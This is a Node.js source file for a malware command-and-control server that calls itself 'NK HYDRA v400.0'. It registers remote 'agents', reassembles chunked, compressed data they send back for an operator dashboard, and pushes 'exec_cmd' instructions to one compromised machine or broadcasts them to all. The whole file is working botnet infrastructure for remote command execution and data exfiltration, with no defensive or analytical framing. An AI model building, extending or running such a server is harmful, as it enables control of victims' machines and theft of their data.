// TYPE: NODE.JS C2 SERVER
// NK HYDRA v400.0 [TITAN LINK DE-CHUNKING]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const zlib = require('zlib'); // Native Node module

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v400.0' }); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8 // 100MB
});

let agents = []; 
let eventHistory = []; 
let chunkBuffer = {}; // { msgId: { total: N, chunks: { idx: data } } }

function logEvent(event) {
    eventHistory.push({ ...event, timestamp: Date.now() });
    if (eventHistory.length > 1000) eventHistory.shift();
}

io.on('connection', (socket) => {
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            socket.emit('history_dump', eventHistory);
            return;
        }
        
        const existingIdx = agents.findIndex(a => a.id === data.id);
        const agentData = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
        if (existingIdx >= 0) agents[existingIdx] = agentData;
        else agents.push(agentData);
        
        io.to('ui_room').emit('agents_list', agents);
        logEvent({ type: 'SYSTEM', payload: { message: `Agent ${data.id} connected`, level: 'INFO', source: 'C2' }});
    });

    // TITAN LINK DE-CHUNKING
    socket.on('agent_chunk', (packet) => {
        const { id, idx, total, data, type, agentId } = packet;
        
        if (!chunkBuffer[id]) chunkBuffer[id] = { total, chunks: [], count: 0, type, agentId };
        
        // Idempotency check
        if (!chunkBuffer[id].chunks[idx]) {
            chunkBuffer[id].chunks[idx] = data;
            chunkBuffer[id].count++;
        }

        if (chunkBuffer[id].count === total) {
            // Reassemble
            try {
                const fullBase64 = chunkBuffer[id].chunks.join('');
                const compressedBuffer = Buffer.from(fullBase64, 'base64');
                zlib.unzip(compressedBuffer, (err, buffer) => {
                    if (!err) {
                        const jsonStr = buffer.toString();
                        const payload = JSON.parse(jsonStr);
                        
                        // Emit Full Event
                        const fullEvent = { type: chunkBuffer[id].type, agentId: chunkBuffer[id].agentId, payload };
                        io.to('ui_room').emit('agent_event', fullEvent);
                        logEvent(fullEvent);
                    } else {
                        console.error("Decompression error", err);
                    }
                    delete chunkBuffer[id]; // Cleanup
                });
            } catch (e) {
                console.error("Reassembly error", e);
                delete chunkBuffer[id];
            }
        }
    });

    // Legacy handler for small events (Heartbeats)
    socket.on('agent_event', (data) => {
        io.to('ui_room').emit('agent_event', data);
        logEvent(data); 
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { agent.lastSeen = Date.now(); agent.status = 'Online'; }
    });

    socket.on('exec_cmd', (data) => {
        if (data.targetId === 'all') socket.broadcast.emit('exec_cmd', data); 
        else {
            const agent = agents.find(a => a.id === data.targetId);
            if (agent) io.to(agent.socketId).emit('exec_cmd', data);
        }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            setTimeout(() => {
                const stillHere = agents.find(a => a.id === agent.id && a.status === 'Online');
                if (!stillHere) {
                    agent.status = 'Offline'; 
                    io.to('ui_room').emit('agents_list', agents);
                }
            }, 5000); 
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v400.0 LISTENING ON ${PORT}`));
